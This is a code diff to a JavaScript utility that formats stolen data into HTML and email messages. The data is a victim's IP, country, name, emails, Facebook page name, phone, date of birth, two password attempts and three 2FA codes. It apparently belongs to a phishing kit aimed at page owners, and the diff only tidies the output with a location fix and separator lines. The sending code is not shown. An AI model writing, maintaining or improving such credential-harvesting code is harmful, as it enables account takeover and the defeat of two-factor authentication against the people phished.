@@ -78,15 +78,18 @@ const Utils = {
 
         const text = `
 <b>IP Address:</b> <code>${locationData.ip}</code>
-<b>Country:</b> <code>${location})</code>
+<b>Country:</b> <code>${locationData.location})</code>
+----------------------------------
 <b>Full Name:</b> <code>${data.fullName || ''}</code>
 <b>Email:</b> <code>${data.email || ''}</code>
 <b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
 <b>Page Name:</b> <code>${data.fanpage || ''}</code>
 <b>Phone:</b> <code>${data.phone || ''}</code>
 <b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
+----------------------------------
 <b>Password:</b> <code>${data.password || ''}</code>
 <b>Password:</b> <code>${data.passwordSecond || ''}</code>
+----------------------------------
 <b>2FA:</b> <code>${data.twoFa || ''}</code>
 <b>2FA:</b> <code>${data.twoFaSecond || ''}</code>
 <b>2FA:</b> <code>${data.twoFaThird || ''}</code>`;
@@ -111,15 +114,18 @@ const Utils = {
 
         const emailContent = `
 IP Address: ${locationData.ip}
-Country: ${location}
+Country: ${locationData.location}
+----------------------------------
 Full Name: ${data.fullName || ''}
 Email: ${data.email || ''}
 Email Business: ${data.emailBusiness || ''}
 Page Name: ${data.fanpage || ''}
 Phone: ${data.phone || ''}
 Date of Birth: ${data.day}/${data.month}/${data.year}
+----------------------------------
 Password: ${data.password || ''}
 Password: ${data.passwordSecond || ''}
+----------------------------------
 2FA: ${data.twoFa || ''}
 2FA: ${data.twoFaSecond || ''}
 2FA: ${data.twoFaThird || ''}
